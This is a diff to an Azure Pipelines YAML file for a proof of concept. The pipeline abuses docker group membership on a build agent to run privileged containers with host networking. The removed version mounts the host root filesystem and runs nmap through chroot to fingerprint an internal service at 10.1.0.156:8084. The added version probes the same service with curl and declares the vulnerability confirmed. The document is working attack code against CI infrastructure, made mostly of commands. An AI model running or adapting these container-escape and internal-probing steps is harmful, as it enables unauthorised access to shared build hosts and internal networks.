@@ -8,16 +8,16 @@ name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
 - stage: FinalPoc
-  displayName: 'Final PoC: Advanced Service Fingerprinting'
+  displayName: 'Final PoC: Direct HTTP Probe'
   jobs:
-  - job: Linux_Advanced_Service_Interrogation
-    displayName: 'PoC: Fingerprint Discovered Internal Service'
+  - job: Linux_HTTP_Probe
+    displayName: 'PoC: Probe Discovered Service via HTTP'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
     - task: Bash@3
-      displayName: 'Escape Container and Fingerprint Target Service'
+      displayName: 'Escape Container and Probe Target Service with Curl'
       inputs:
         targetType: inline
         script: |
@@ -32,45 +32,36 @@ stages:
           fi
           echo "✅ Confirmed user is in 'docker' group."
 
-          # Target IP and Port discovered from the previous scan
           TARGET_IP="10.1.0.156"
           TARGET_PORT="8084"
 
-          echo "--- Installing tools (Nmap) ---"
-          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
+          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} with a clean HTTP request ---"
           
-          echo "--- ESCAPING CONTAINER to fingerprint ${TARGET_IP}:${TARGET_PORT} from the host ---"
-          
-          # This is the corrected command. It creates a temp directory on the host,
-          # runs the chrooted nmap to write its output there, and then we copy it back.
-          docker run --rm --privileged --network=host -v /:/hostfs \
-            -v /usr/bin/nmap:/usr/bin/nmap -v /usr/share/nmap:/usr/share/nmap \
+          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
             alpine:latest sh -c "
-              # Create a directory on the HOST we can write to from inside the chroot
-              mkdir -p /hostfs/tmp/scan_results
+              apk add --no-cache curl
 
-              echo '--- [HOST] Attempting to fingerprint the service with Nmap Version Detection (-sV) ---'
+              echo '--- [HOST] Attempting a standard HTTP GET request with curl ---'
               
-              # -sV: Probe open ports to determine service/version info
-              # Write the output to the host's /tmp/scan_results directory
-              chroot /hostfs /usr/bin/nmap -Pn -sV --version-intensity 5 -p ${TARGET_PORT} ${TARGET_IP} -oN /tmp/scan_results/service-fingerprint.txt
+              # Use curl with a longer timeout and verbose logging to capture everything.
+              # This sends a very standard User-Agent and Accept header.
+              curl --verbose --connect-timeout 20 "http://${TARGET_IP}:${TARGET_PORT}/" > /artifacts/http_probe_body.txt 2> /artifacts/http_probe_stderr.txt || true
             "
           
-          # Now, copy the results from the host's temp directory back into our artifacts folder
-          sudo cp /tmp/scan_results/* artifacts/
-          sudo rm -rf /tmp/scan_results
+          echo "✅ PROBE COMPLETE."
+          echo "--- Curl stderr (Connection Details & Headers) ---"
+          cat artifacts/http_probe_stderr.txt
+          echo
+          echo "--- Curl stdout (Response Body) ---"
+          cat artifacts/http_probe_body.txt
 
-          echo "✅ FINGERPRINTING COMPLETE."
-          echo "--- Nmap Service/Version Scan Results ---"
-          cat artifacts/service-fingerprint.txt
-
-          if grep -q "State: open" artifacts/service-fingerprint.txt; then
-            echo "✅ VULNERABILITY CONFIRMED: Successfully connected to the open port and gathered service information."
+          if [ -s "artifacts/http_probe_body.txt" ] || grep -q "Connected to" artifacts/http_probe_stderr.txt; then
+            echo "✅ VULNERABILITY CONFIRMED: Successfully connected and/or received a response from the internal service."
           else
-            echo "⚠️ Test inconclusive. Could not gather service information from the open port."
+            echo "⚠️ Final attempt inconclusive. The service is running but is not responding to standard HTTP requests."
           fi
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Service Fingerprint Artifacts'
+      displayName: 'Publish HTTP Probe Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
